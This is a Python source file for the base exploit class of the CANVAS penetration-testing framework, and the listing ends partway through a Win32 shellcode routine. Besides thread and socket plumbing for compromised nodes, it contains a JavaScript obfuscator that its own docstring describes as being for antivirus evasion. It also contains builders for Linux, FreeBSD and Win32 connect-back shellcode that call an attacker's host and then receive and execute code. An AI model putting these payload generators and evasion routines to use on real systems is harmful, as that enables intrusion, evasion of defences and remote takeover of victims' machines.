#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
canvasexploit class

This is the root class for all CANVAS exploits. It contains everything which ALL canvas exploits
need. In some cases this is shellcode creation libraries, but it's also socket creation and
storage of state for anything that is so generic all exploits use it. Most exploits derive from
this or the tcpexploit class.

"""

from libs.reports import utils
from hostlistener import hostlistener
from exploitutils import *
from gc import collect
import timeoutsocket
import canvasengine #for canvas_root_dir
import os, sys, time
import re
import zlib

import logging
logging.getLogger()

# fix to be backwards compatible
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")

PACKED_WIN64_TEMPLATE='AV_bypass/bin/inmem64_canvas.exe'
PACKED_WIN32_TEMPLATE='AV_bypass/bin/inmem32_canvas.exe'

from shellcode import shellcodeGenerator
from encoder import *
import random
import shutil
from engine import CanvasConfig
from threading import Thread
import thread
import ThreadRunner2
from MOSDEF import mosdef
from exploitutils import intel_order,randomletters, cprint
from libs.canvasos import canvasos
from MOSDEF import pelib
from canvaserror import *
from shellcode import linuxshell
from shellcode import win32shell
from sniffer import sender #for can_scanrand()
from sniffer import get_iface_from_target #for can_scanrand()

import MOSDEFSock
from libs.daveutil import dmkdir

def allowAddress(addr, addrlist):
    for a in range(0, 32, 8):
        tmp= (addr >> a) & 0xff
        if tmp in addrlist:
            return 0
    return 1

class ArgError(Exception):

    def __init__(self, value):
        self.value = value

    def __str__(self):
        return repr(self.value)

class _GeoIPutils:
    _gi_initialized = False
    _gi_list = None
    def getGeoIPlist(self):
        if not self._gi_initialized:
            if CanvasConfig['geoip']:
                import libs.pygeoip as GeoIP
                try:
                    db_path = os.path.join('gui', 'WorldMap', 'GeoLiteCity.dat')
                    self._gi_list = GeoIP.GeoIP(db_path, GeoIP.MEMORY_CACHE)
                    self._gi_initialized = True
                except IOError:
                    logging.warning("No GeoIP database")
                    self._gi_list = None
                    self._gi_initialized = False

        return self._gi_list

import traceback
from random import randint

class ThreadRunner(Thread):
    """
    Used for threaded run on host
    """
    def __init__(self, target, parent):
        Thread.__init__(self)
        self.setDaemon(1)
        self.target=target
        self.parent=parent
        self.result=None
        self.check_for_life=False #if this is true, we check for life

    def enter(self):
        """A simple-psuedo-mutex"""
        self.parent.enter(thread_to_add_to_table=self, ip_to_add_to_table=self.target)

    def leave(self):
        """leave our mutex"""
        self.parent.leave(thread_to_remove_from_table=self.target)

    def suicide(self):
        """hook to allow parent to kill dead thread"""
        ###call exit routines in attack module ????
        #self.parent.setstate("halt") #syntax wrong
        thread.exit()

    def run(self):
        """
        Does a simple "mutex" to ensure we only use as many threads
        as we've set up in maxthreads
        """
        parent=self.parent
        host=self.target
        try:
            node=parent.argsDict["passednodes"][0]
        except:
            #no node?
            print "ERROR: No node in ThreadRunner?"
            return
        self.enter()
        #we check to see if we already have a real target
        #or if it's a string (ip/hostname)
        #if it's aa string, and we have check_for_life of true,
        #we go ahead and scan for life, and if it's not alive, we
        #bail
        ret=0
        if type("")==type(host) and self.check_for_life:
            try:
                target=node.get_known_host(host)
                if not target:
                    self.parent.log("Looking for host %s"%host)
                    if not self.parent.checkAlive(host):
                        self.parent.log("Host %s not alive"%host)
                        self.leave()

                        return
                    self.target=node.new_host(host)
                ret=1
            except:
                ret=0
            if not ret:
                self.leave()
                return

        #if self.target is a string, we're going to assume it's alive
        #We don't add it to our list in this case because we have not
        #checked it for life. portsweep and other recon modules will
        #do that for us if it is alive
        if type("")==type(self.target):
            self.target=node.new_host(self.target,add=0)
        #need to prevent an exception from causing our currentthreads to be ignored
        try:
            ret=self.parent.run_on_host(self.target)
        except:
            print "=================Exception caught by ThreadRunner======================="
            traceback.print_exc(file=sys.stdout)
            print "=================Exception caught by ThreadRunner======================="
            ret=0

        if ret not in [1,0,None]:
            parent.results+=[ret]
        self.leave()
        self.result=ret
        return ret

class canvasexploit(hostlistener, _GeoIPutils):
    # Add more
    HALT= "halt"
    PAUSE="pause"
    #this is a list of things we can return in self.result_error
    ERR_COULD_NOT_CONNECT="Could not connect"
    ERR_FAILED="Failed"
    ERR_NO_SHELLCODE="Could not create a shellcode"
    ERR_NO_VERSION="Could not determine version to attack with"
    ERR_NO_LOGIN="Could not log in to remote service"
    SUCCESS="Success"

    CRASHED_UNKNOWN="Unknown"
    CRASHED_SERVICE="Service"
    CRASHED_HOST="Host"
    CRASHED_STILLALIVE="Still alive"

    def __init__(self):
        hostlistener.__init__(self)
        self.result_error=self.SUCCESS
        self.result=None
        self.summary = {}
        #this is defined here so exploits can query it and
        #find out if they are running under autohack
        #in which case their test() can be quite agressive
        #This is most important for exploits, such as web exploits
        #that need to start a listener after they run test()
        #and can only find out what platform they are targeting
        #by exploiting their target and getting a uname -a
        #if silica, this is set to "silica" so we know how to behave
        self.autohack_state="aggressive"
        self.postactions=[] #actions to take when exploit is done
        self.remoteport=0
        self.logfunction=None
        self.debugfunction=None
        self.succeeded=0
        self.InitString=""
        self.versions={}
        self.user=None
        self.password=None
        self.command=""
        self.host=None
        self.port=None
        self.mycanvasengine=None
        self.name="CANVAS Exploit: %s"%repr(self)
        self.setInfo(self.name,showlog=0)
        self.state="starting"
        #our three main variables
        self.target=None
        self.callback=None
        self.argsDict={}
        self.argsDict["passednodes"]=[]
        self.supportedNodeArgs=[]
        self.listenerArgsDict={}
        self.version=1
        self.badstring=""
        #supportedNode is used for gettcpsock() and friends. This is a list of nodes that
        #can do socket operations, basically
        self.socketSupportedNode = ["linuxNode","win32Node", "win64Node", "solarisNode", "aixNode", "bsdNode","osxNode", "ScriptNode"]
        self.netmask = "32" # for self.run_on_all_*_hosts, WARNING: 32 and not /32
        self.randomizeSocketSource=1 #by default we randomize across all selected nodes!
        self.crashed_status=self.CRASHED_UNKNOWN
        self.force=0 #used to force exploits to run under all known hosts...
        ##Thread bits
        self.maxthreads=256
        self.currentthreads=0
        self.thread_table={} ##Table keyed on target ip, attributes of currently running thread ID
        self.thread_mutex=threading.RLock()
        self.rogue_thread_timeout=600  ##Time to wait in wait_for_threads() for threads to complete by


        self.pausenum = 1
        self.halt_children=[]
        self.loggedInformation=[] #all the information we have logged
        self.mosdeftrojan = None

        #all the functions to call when we succeeded
        self.inform_succeeded=[]

        # If exploit requires a post-exploitation cleanup phase
        self.cleanup_files = {}

    @property
    def module_name(self):
        """Returns the name of the exploit's module."""
        return self.__class__.__module__

    def add_file_for_cleanup(self, path):
        if path:
            if self.node not in self.cleanup_files:
                self.cleanup_files[self.node] = []

            self.cleanup_files[self.node].append(path)

    def perform_cleanup(self):
        """
        Perform cleanup phase once exploit is done
        Cleanup will be performed on all selected nodes if they require it

        self.cleanup_files = dictionary of list
        keys  : nodes
        values: list of files to remove
        """

        if hasattr(self, 'argsDict') and self.argsDict.has_key('passednodes'):
            for node in self.argsDict["passednodes"]:
                if node in self.cleanup_files:
                    self.node = node
                    for f in self.cleanup_files[node]:
                        logging.info("Cleaning up (%s)" % f)
                        self.nodeDeleteFile(f)

                    logging.warning("Cleanup DONE (%s)" % node)

    def __getstate__(self):
        """
        Pickling routine
        """
        odict=self.__dict__.copy() #we modify a dict here
        banned_objects=["thread_mutex","engine","gui"]
        for banned in banned_objects:
            if banned in odict:
                del odict[banned]
        devlog("pickle", "Returning canvasexploit without thread_mutex")
        return odict

    class error(Exception):
        def __init__(self, args=None):
            self.args = args
        def __str__(self):
            return `self.args`

    def raiseError(self, msg):
        raise self.error, msg

    def threadwait(self):
        """
        This function waits until our threadcount is small enough for us to continue
        """
        while (self.maxthreads<=self.currentthreads) and (not time.sleep(0.1) and self.maxthreads<=self.currentthreads) :
            sleeptime=float(randint(1,50))/25.0
            devlog("threads", "Enter sleeping %f seconds"%sleeptime)
            time.sleep(sleeptime)
        return self.maxthreads

    def enter(self, thread_to_add_to_table=None, ip_to_add_to_table=None):
        """Enter our psuedo-mutex"""
        done=0

        while not done:
            self.threadwait()
            self.thread_mutex.acquire()
            if self.maxthreads>self.currentthreads:
                done=1
            self.thread_mutex.release()

        self.thread_mutex.acquire()
        devlog("threads","canvasexploit::enter(%d/%d) %s"%(self.currentthreads,self.maxthreads,self.name))

        ##Add this into our thread_table to track where we still have threads running to
        if thread_to_add_to_table and ip_to_add_to_table:
            self.thread_table[ip_to_add_to_table]=thread_to_add_to_table

        self.currentthreads+=1
        self.thread_mutex.release()
        return

    def doPostAction(self, engine, newnode):
        """ doPostAction is executed before startup.py to allow the exploit do Post Exploitation Actions, for
            clean-up or survival."""
        pass

    def leave(self, thread_to_remove_from_table=None):
        self.thread_mutex.acquire()
        devlog("threads","canvasexploit::leave(%d) %s"%(self.currentthreads, self.name))
        self.currentthreads-=1

        if thread_to_remove_from_table:
            try:
                try:
                    del self.thread_table[thread_to_remove_from_table.interface]
                except AttributeError:
                    ##Find out which modules are out of compliance messing with self.target (it should alwyas be a host knowledge instance)
                    del self.thread_table[thread_to_remove_from_table]
            except KeyError:
                self.log("Trying to remove thread from table that is not there. Maybe a rogue thread woke up? [%s]"%(thread_to_remove_from_table.interface))

        self.thread_mutex.release()
        return

    def getState(self):
        return self.state

    def setState(self,state):
        self.state=state
        return self.state

    def pause(self):
        # For exploit development on commandline only
        self.log("[Press any key to continue #%d]" % self.pausenum)
        sys.stdin.read(1)
        self.pausenum += 1

    def setLogFunction(self,logfunction):
        self.logfunction=logfunction
        return

    def setDebugFunction(self, debugfunction):
        self.debugfunction=debugfunction
        return


    def do_data_view(self, col_title, data):
        """
        Method to call out to from the canvas modules to do the sexy data view stuff:

        IN: col_title - list of titles for columns
            data      - list of data items to be applied to each column (for multiple columns, list of lists)
        """
        if hasattr(self,  "dataviewcolumnsfunction") and hasattr(self, "dataviewinfofunction"):
            self.DataViewColumns(col_title)
            c = []

            for d_row in data:
                c.append(d_row)
            self.DataViewInfo(c)

    def setDataViewColumnsFunction(self, dataviewcolumnsfunction):
        self.dataviewcolumnsfunction=dataviewcolumnsfunction
        return

    def DataViewColumns(self,args):
        self.dataviewcolumnsfunction(args)
        return

    def setDataViewInfoFunction(self, dataviewinfofunction):
        self.dataviewinfofunction=dataviewinfofunction
        return

    def DataViewInfo(self,args):
        self.dataviewinfofunction(args)
        return

    def chr_encode( self, encoded_javascript ):
        """
        Build an array of the ordinals like [1,2,3,4]
        """

        code = []

        for i in encoded_javascript:
            code += ["%d" % ord(i)]

        code = ",".join(code)

        final_code = "[%s]" % code

        return final_code


    def xor_encode( self, javascript, xor_key ):

        code = []
        for i in javascript:
            code += [chr( ord( i ) ^ xor_key)]

        code = "".join(code)

        return code

    def obfuscate_javascript( self, javascript_code ):

        """
        This will replace your javascript exploit with a large array
        of ordinals (which make up your exploit bytes), and a simple
        decoder loop. From there it is XOR encoded/decoded. Useful for
        bypassing Antivirus.
        """

        bad_char           = "\""
        encoded_javascript = "\""

        while bad_char in encoded_javascript:
            encoded_javascript = ""
            xor_key            = random.randint(1, 255)
            encoded_javascript = self.xor_encode( javascript_code, xor_key )

        # Now we charencode the beast!
        encoded_javascript     = self.chr_encode( encoded_javascript )

        # Now create a variable that's a string holding our XOR'd
        # javascript and write a little decoder
        javascript_decoder = """

        function loadBody()
        {
        ENCODED_JAVASCRIPT

        var browserTest = "";

        for(i=0;i<browserTestVersions.length;i++)
        {
           browserTest += String.fromCharCode( browserTestVersions[i] );
        }

        var browserVersion = XOR_KEY;
        var locationTest = "";

           for(i=0;i<browserTest.length;i++)
           {
		locationTest += String.fromCharCode( browserVersion^browserTest.charCodeAt(i) );

           }

           eval( locationTest );

        }

        loadBody();
        """

        javascript_decoder = javascript_decoder.replace( "ENCODED_JAVASCRIPT", "var browserTestVersions = %s;" % encoded_javascript)
        javascript_decoder = javascript_decoder.replace( "XOR_KEY", "%d" % xor_key )

        return javascript_decoder

    def simple_js_obfuscator(self,data,variables=None):
        """
        Ofuscates data in a similar fashion like
        http://www.javascriptobfuscator.com/Default.aspx
        """

        single_quote = re.findall(r'\'(.+?)\'',data)
        param_function = re.findall(r'\.(.+?)\(',data)
        param_function += re.findall(r'\.(.+?)\s',data)

        double_quote = re.findall(r'\"(.+?)\"',data)

        var_name = randomletters()
        storage = []

        # Change every string for an equivalent storage[pos], string with singles quotes
        for elem in single_quote:
            if elem not in storage:
                storage.append(elem)
            data = data.replace("\'" + elem + "\'",'%s[%d]' % (var_name,storage.index(elem)))

        # Change every string for an equivalent storage[pos], string with double quotes
        for elem in double_quote:
            if elem not in storage:
                storage.append(elem)
            data = data.replace("\"" + elem + "\"",'%s[%d]' % (var_name,storage.index(elem)))

        # Change every function call like document.getElementybyId for an equivalent document[storage[pos]]
        for elem in param_function:
            if elem not in storage:
                # We might find nested fuctions, like exploit_div.firstChild.applyElement()
                for function in elem.split('.'):
                    if function not in storage:
                        storage.append(function)
                        data = data.replace(function ,'[%s[%d]]' % (var_name,storage.index(function)))

        # There should be no more dots in the document(assuming we only use dots for function calling)
        data = data.replace('.','')

        # Randomize variables names
        if variables:
            for var in variables:
                data = data.replace(var,randomletters())

        #DEBUG
        #for elem in storage:
        #    print elem + str(storage.index(elem))

        ofuscated_storage = []
        for elem in storage:
            # Dont change the shellcode
            if '\\u' not in elem:
                ofuscated_storage.append(cprint(elem)[1:-1])
            else:
                ofuscated_storage.append(elem)

        # Append the storage to the new generated js
        ofuscated_data = "var %s = %s;\n" % (var_name,str(ofuscated_storage).replace('\\\\','\\'))
        ofuscated_data += data
        return ofuscated_data

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
        return

    def fake_getarg(self, attribute):
        print "Argument: %s with default %s"%(attribute, getattr(self, attribute))
        return getattr(self, attribute)

    def xml_daemonize(self):
        """
        Send us off via XML-RPC to do clientd on a listening engine
        """
        #these get passed over via self.link() from clientd.
        self.log("Getting arguments for %s"%self.name)
        self.get_required_arguments()

        self.log("Setting up clientd")
        clientd = self.engine.getModuleExploit("clientd")
        #now set the arguments we need
        clientd.auto_detect_exploits = False
        clientd.allowed_attack_modules = [self.name]
        clientd.get_required_arguments()

        from CLI import cli
        commandline = cli.CommandLineInterface()
        arguments = "SPAWNRUNMODULE clientd"+clientd.print_required_arguments()
        self.log("Arguments: %s"%arguments)
        try:
            commandline.handle_command_line(arguments)
        except:
            self.log("Could not connect to XML RPC server!")
            return

        #we are done!
        sys.exit(1)

    def print_required_arguments(self):
        """
        print our arguments in a -O format
        """
        if not hasattr(self, "required_arguments"):
            return False

        ret = ""
        for argument in self.required_arguments():
            value = getattr(self, argument)
            if type(value) == type([]):
                #we got a list, so we make it an argument
                value = ",".join(value)
            ret += " -O %s:%s"%(argument, value)
        return ret


    def get_required_arguments(self):
        """
        On the commandline gets all the required arguments to set up a clientd session
        """
        if not hasattr(self, 'required_arguments'):
            devlog("canvasexploit","Could not find a required_arguments function. No wizard!")
            return False

        required = self.required_arguments()
        for argument in required:
            default = getattr(self, argument, None)
            print "Please enter value for %s or <enter> for default (%s): "%(argument, default),
            data = raw_input(">")
            #self.setarg will also set the type properly.
            if data:
                self.setarg(argument, data)
        return True

    def setarg(self, arg, value):
        """
        Sets an argument (recv'd from gui/commandline/etc)
        to the right type and value.
        """
        def tolist(arg):
            """
            Converts a string to a list (sep by ,)
            """
            return arg.split(",")

        def tobool(arg):
            """
            special case "0" is a "False"
            """
            if arg in ["", "0","False"]:
                return False
            else:
                return bool(arg)

        t = type(getattr(self, arg))
        try:
            # assumes str on NoneType
            v = {   'str'       : str,
                    'long'      : long,
                    'int'       : int,
                    'bool'      : tobool,
                    'list'      : tolist,
                    'NoneType'  : str }[t.__name__](value)
            setattr(self, arg, v)
        except KeyError:
            raise ArgError('lacking arg type conversion for type: %s' % t.__name__)
        except:
            raise ArgError('type conversion error for value %s to type %s' % (repr(value), t.__name__))
        return getattr(self, arg)

    def getarg(self, arg):
        """
        getarg is used in the self.getArgs() function to get a single
        string argument
        self.getarg("user") is the same as:
        self.user=self.argsDict.get("user",self.user)
        """



        if not hasattr(self, arg):
            raise ArgError('No such argument in object ...')

        # account for 0, assume None will not exist as a valid val?
        if self.argsDict.get(arg) != None:
            self.setarg(arg, self.argsDict.get(arg))

        return getattr(self, arg)

    def debuglog(self, message, color="black", enter="\n"):
        """
        Might be run in the thread context of an exploit, and not in the gui thread context
        """
        if self.debugfunction==None:
            sys.stdout.write("[debug] " + str(message) + enter)
            #print  "[debug] "+ message
        else:
            # self.name/self.id would be erased at one point
            message="%s [%d]: %s"%(self.name, self.id, message)
            self.debugfunction(message, color, enter="\n")

    def set_command(self,command):
        self.command=command

    def set_user(self, user):
        self.user = user

    def get_user(self):
        return self.user

    def set_password(self, password):
        self.password = password

    def get_password(self):
        return self.password

    def halt(self, blacklist=None):
        """
        Sets my state to halt, as well as all my children
        CANNOT BLOCK as this will be done in the main thread
        """
        if blacklist==None:
            blacklist={}
        if blacklist.get(self):
            return
        blacklist[self]=True

        self.setState(self.HALT)
        for child in self.children:
            child.halt(blacklist=blacklist)
        for child in self.halt_children:
            #these are objects that support halt, but are not otherwise children. Real children are
            #also touched by gui code, etc.
            child.halt()
        self.halt_children=[] #reset this. These are gone now.
        self.log("%s set state to halt"%self.name)
        return

    def getpipe(self,pipename):
        "gets a named pipe locally"
        pipenode=self.argsDict["passednodes"][0]
        if pipenode.nodetype in ["LocalNode"]:
            if os.name=="posix":
                #cygwin/linux
                self.log("Cannot open named pipes locally on this Python...are you using Cygwin instead of native Python?")
                return 0
            elif os.name=="nt":
                #on win32, with native Python, just open one up
                from localPipe import localPipe
                fd=localPipe(pipename)

        elif "win32api" in pipenode.capabilities:
            #TO FIX WITH SOME SORT OF OBJECT
            from localPipe import MOSDEFPipe
            fd=MOSDEFPipe(pipenode.shell)
            ret=fd.open(pipename)
            if ret==-1:
                return 0
        else:
            self.log("Nodetype %s not supported for getpipe()"%pipenode.nodetype)
            self.log("capabilities: %s"%pipenode.capabilities)
            return 0
        return fd

    def getrawsock(self):
        """only for linuxNode at the moment"""
        s=None
        socknode=self.argsDict['passednodes'][0]
        if socknode.nodetype in ['linuxNode']:
            s=MOSDEFSock.MOSDEFSock(-1,socknode.shell,proto='raw')
            devlog('canvasexploit','Got remote RAW socket object')
        return s

    def getudpsock(self, AF_INET6=0):
        """we assume the first node in the list is the node we want to create
        a socket object with"""
        s=None
        socknode=self.argsDict["passednodes"][0]
        if socknode.nodetype in ["LocalNode"]:
            if AF_INET6:
                s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        elif socknode.nodetype in self.socketSupportedNode:
            s = MOSDEFSock.MOSDEFSock(-1, socknode.shell, proto="udp")
            devlog("canvasexploit","Got remote UDP socket object")

        return s

    def gettcpsock(self,socknode=None, noipv6=0, AF_INET6=0):
        """we assume the first node in the list is the node we want to create
        a socket object with unless self.randomizeSocketSource is set - in which
        case we return a socket from a random node

        We return a socket on success and None on error (no valid nodes found)

        """

        if not socknode:
            if self.randomizeSocketSource:
                #if randomize is set, we pick a random node from our passednodes, and create our
                #tcp socket on that
                allnodes=self.argsDict["passednodes"]
                if allnodes==[]:
                    #we need at least one node here...
                    devlog("ERROR: canvasexploit  got passed a zero length node list ")
                #Only uncomment this when things are going badly
                #devlog("canvasexploit","Length of allnodes=%d"%len(allnodes))
                while socknode==None:
                    nodenum=random.randint(0,len(allnodes)-1)
                    socknode=allnodes[nodenum]
                    if socknode.nodetype not in (["LocalNode"]+self.socketSupportedNode):
                        socknode=None #we can't use this node. Perhaps it's here for some other reason?
            else:
                socknode=self.argsDict["passednodes"][0]
            if socknode==None:
                devlog("Error: Socknode is none in canvasexploit::gettcpsock")
        if socknode.nodetype in ["LocalNode"]:

            # XXX: only localnode ipv6 support for beta linux/windows
            # XXX: this will require minimal porting of attacks to ipv6 if
            # XXX: we lack access to self.callback here

            # try being transparent for switching into IPv6 connects
            # have the notipv6 control for situations where you want a tcp sock
            # to a non ipv6 addie inside an ipv6 exploit.

# NOTES ON GETTING SCOPE ID FOR LINK LOCAL ADDIES (mostly used in discovery protocols, dhcp etc.)
#>>> res = socket.getaddrinfo("fe80::20c:29ff:fe8d:f629", 5001, socket.AF_INET6, socket.SOCK_STREAM)
#>>> print res[0][4]
#('fe80::20c:29ff:fe8d:f629', 5001, 0, 0)
#>>>

            # XXX: try and both be transparent, and flexible .. oi vey

            if (self.target != None and not noipv6 and ":" in str(self.target.interface)) or AF_INET6:
                if AF_INET6: # only show it on explicit requests
                    print "[!] switching socket mode to AF_INET6 ..."
                s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        elif socknode.nodetype in self.socketSupportedNode:

            s = MOSDEFSock.MOSDEFSock(-1, socknode.shell)
            print "Got remote socket object"
        else:
            devlog("ERROR: Got the wrong kind of node in gettcpsock()!")
            s=None

        return s

    def gettcplistener(self, listenport, listenhost = None, timeout=5.0):
        # XXX: do we need to be able to set the "::" ipv6 equiv here? how
        # XXX: common is it to not have a listenhost set ?
        import MOSDEFSock
        s = None
        devlog("gettcplistener", "GetTcpListner(%s,%s)"%(listenport,listenhost))
        if not listenhost or listenhost == "":
            devlog('gettcplistener', "listenhost not set, setting to 0.0.0.0")
            listenhost = "0.0.0.0"

        # transparant ipv6 support based on binding interface, see "::" possible issue
        ipv6 = 0
        if ":" in str(listenhost):
            ipv6 = 1

        devlog('gettcplistener', "binding on %s:%d" % (listenhost, listenport))

        socknode=self.argsDict["passednodes"][0]
        if socknode.nodetype in ["LocalNode"]:
            if ipv6:
                s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            if hasattr(socket, 'SO_EXCLUSIVEADDRUSE') == True:
                # windows
                s.setsockopt(socket.SOL_SOCKET, socket.SO_EXCLUSIVEADDRUSE, 1)
            else:
                s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)

        elif socknode.nodetype in self.socketSupportedNode:
            # XXX: ipv6 warning for now
            if ipv6:
                print "[!] CANT BIND IPV6 ON REMOTE NODES FOR NOW"
                return None
            else:
                devlog("gettcplistener", "Getting a bound socket on shellserver: %s"%type(socknode.shell))
                fd = socknode.shell.getListenSock(listenhost, listenport)
                s = MOSDEFSock.MOSDEFSock(fd, socknode.shell)
                s.set_timeout(timeout)
                devlog("gettcplistener", "Got remote socket object")
                return s
        else:
            devlog("gettcplistener", "socknode.nodetype %s not in supported socket node!"%type(socknode.nodetype))
            return None


        try:
            s.bind((listenhost,listenport))
        except socket.error, msg:
            s.close()
            self.log("Could not listen on that host:port: %s:%d - %s"%(listenhost,listenport,msg))
            #import traceback
            #traceback.print_exc()
            return None

        # XXX: for ipv6 transparency, not set_timeout capable on sockets
        try:
            s.set_timeout(timeout) #accept for 5 seconds before timeout
        except:
            pass

        s.listen(5)
        return s

    def isactive(self,sock):
        """is a socket active?"""
        import select
        socknode=self.argsDict.get("passednodes",[None])[0]
        if socknode==None or socknode.nodetype in ["LocalNode"]:
            rd, wr, ex = select.select([sock], [], [], 10)
        elif socknode.nodetype in self.socketSupportedNode:
            rd = sock.isactive()
        return rd

    def ISucceeded(self):
        """Checks to see if a callback has come back for us. If it has,
        return 1, else 0.

        If this is a remote node's responsibility, then the remote node
        will get accept() called on it, and will return if it was successful
        in spawning a new node
        """
        devlog("canvasexploit", "Checking to see if I succeeded")
        devlog("canvasexploit", "Self.callback=%s" % self.callback)
        sys.stdout.flush()

        if self.succeeded:
            devlog("canvasexploit", "Already knew I suceeded!")
            return 1

        if self.callback and "fakeListenerLine" not in str(self.callback):
            #what I really mean here is "am I a GUI or did you run me from the commandline"
            devlog("canvasexploit", "Am I a GUI? %s" % str(self.callback))
            if self.callback:
                devlog("canvasexploit", "Callback is defined")
                try:
                    parentnode = self.callback.parent.parent.parent
                except AttributeError:
                    devlog("canvasexploit", "No parent node for callback!")
                    #we are a fake listener line - which means we are running from the commandline...
                    try:
                        devlog("canvasexploit", "Looking for listener file on file system for connectback info")
                        listenername = os.path.join(canvasengine.canvas_root_directory,"listener-%s" % str(self.remoteport))
                        os.stat(listenername)
                        return 1
                    except:
                        return 0
                #gui...
                if not parentnode:
                    return self.succeeded
                nodetype=parentnode.nodetype
                if nodetype == "LocalNode":
                    return self.succeeded
                elif nodetype in self.socketSupportedNode:
                    #MOSDEF nodes need to go call accept() and see if it
                    #worked. These sockets are set to nonblocking so they'll
                    #return immediately if nothing is listening
                    #if something is listening they'll set up the new shellserver Node
                    #and return 1
                    #callback is of class listenerLine, btw.
                    self.log("Checking callback to see if we got a connection.")
                    ret = self.callback.check() #will add new node if one is found!
                    #check twice

                    ret2 = ret
                    while ret2:
                        self.log("Checking callback to see if we got a connection (try2).")
                        time.sleep(0.4)
                        ret2 = self.callback.check() #will add new node if one is found!
                        #print "Ret2=%s"%ret2
                        sys.stdout.flush()
                    #ret is a socket, socket wrapper type or None
                    for r in [ret,ret2]:
                        if r not in [None,0,-1,uint32(-1)]:
                            self.succeeded = 1
                else:
                    devlog("canvasexploit", "ERROR: Unknown type of listener...")
                    sys.stdout.flush()
            return self.succeeded
        else:
            try:
                if not self.callback:
                    devlog("canvasexploit", "No callback - no need to check for success")
                    return 0
                listenerfilename = "listener-%s" % str(self.callback.port)
                devlog("canvasexploit", "Using commandline - looking for %s"%listenerfilename)
                # for future using commandline...
                os.stat(listenerfilename)
                devlog("canvasexploit", "%s did exist!!!" % listenerfilename)
                self.succeeded = 1
                return 1
            except OSError:
                devlog("canvasexploit", "%s did not exist"%listenerfilename)
                return 0

    def setSucceeded(self):
        self.succeeded = 1
        self.setProgress(100)
        return

    def setHelperHost(self, host):
        self.helperhost = host
        return

    def neededListenerTypes(self):
        return []

    def setVersion(self,version):
        self.version=version
        return

    #just a placekeeper
    def createShellcode(self):
        return "A"

    def test(self):
        """Default action of test is to return not vulnerable,
        so the scanner can ignore modules which have no test defined

        In this base class, we return None instead of zero, this allows you to
        differentiate (if you so choose) between "test not defined" (None) and "test failed" (0)

        test() is also responsible for setting self.version
        """
        return None


    def setHost(self,host):
        self.host=host
        return

    def createFreeBSDCallbackShellcode(self,host,port):
        """
        Creates a shellcode to call back to a FreeBSD MOSDEF Node
        """
        sc = shellcodeGenerator.bsd_X86()
        sc.addAttr("setuid",None)
        sc.addAttr("setreuid",None)
        sc.addAttr("connect",{"ipaddress": host, "port": port})
        sc.addAttr("read_and_exec",None)
        self.shellcode = sc.get()
        if self.badstring:
            #only encode if we have to
            encoder = chunkedaddencoder.intelchunkedaddencoder()
            encoder.setbadstring(self.badstring)
            self.log("Encoding shellcode")
            self.shellcode = encoder.encode(self.shellcode)

            if self.shellcode == "":
                raise Exception, "Could not encode shellcode!"
        return self.shellcode


    def createLinuxUniversalShellcode(self):
        """
        Creates a universal MOSDEF callback Linux x86 shellcode
        """
        sc = shellcodeGenerator.linux_X86()
        sc.addAttr("connect", {"port" : self.callback.port,
                               "ipaddress" : self.callback.ip,
                               }
                   )
        mosdef_type=self.engine.getMosdefType(canvasengine.LINUXMOSDEF_INTEL)
        mosdef_id=self.engine.getNewMosdefID(self)
        sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id, "fdreg": "esi",})
        sc.addAttr("read_and_exec",{"fdreg": "esi"})
        rawshellcode = sc.get()
        if not hasattr(self, "badstring"):
            badstring = ""
        else:
            badstring = self.badstring
        shellcode=self.intel_encode(badstring, rawshellcode)

        if not shellcode:
            self.log("Could not encode shellcode")
            return 0

        self.log( "Done encoding shellcode of length: %d"%len(shellcode))

        #debug int if neededx
        #shellcode="\xcc"+shellcode
        self.setShellcode(shellcode)
        return shellcode


    def createWin32Shellcode_universal(self,badstring,localhost,localport,rawshellcode=None):
        """
        Calls back to a host and port (using universal code)
        """
        mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
        mosdef_id=self.engine.getNewMosdefID(self)
        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
        sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
        sc.addAttr("RecvExecDepSafe",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("ExitThread",None)

        rawshellcode = sc.get()

        if badstring=="":
            #no bad characters? Great!
            self.shellcode=rawshellcode
            return self.shellcode
        self.log("Raw shellcode (before encoding) is %d byte"%len(rawshellcode))

        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=self.intel_encode(badstring, rawshellcode)

        if not shellcode:
            self.log("Could not encode shellcode")
            return 0

        self.log( "Done encoding shellcode.")

        #debug int
        #shellcode="\xcc"+shellcode
        self.setShellcode(shellcode)
        return shellcode

    def createWin32Shellcode(self,badstring,localhost,localport,rawshellcode=None):
        """

        Creates Win32 MOSDEF Shellcode

        """


        if rawshellcode in ["",None]:
            self.log("Generating typical Win32 shellcode")

            sc = shellcodeGenerator.win32()
            #sc.addAttr("ForkLoad", None)
            # the to fork code
            sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
            sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            sc.addAttr("ExitThread",None)

            rawshellcode = sc.get()

        if badstring=="":
            #no bad characters? Great!
            self.shellcode=rawshellcode
            return self.shellcode
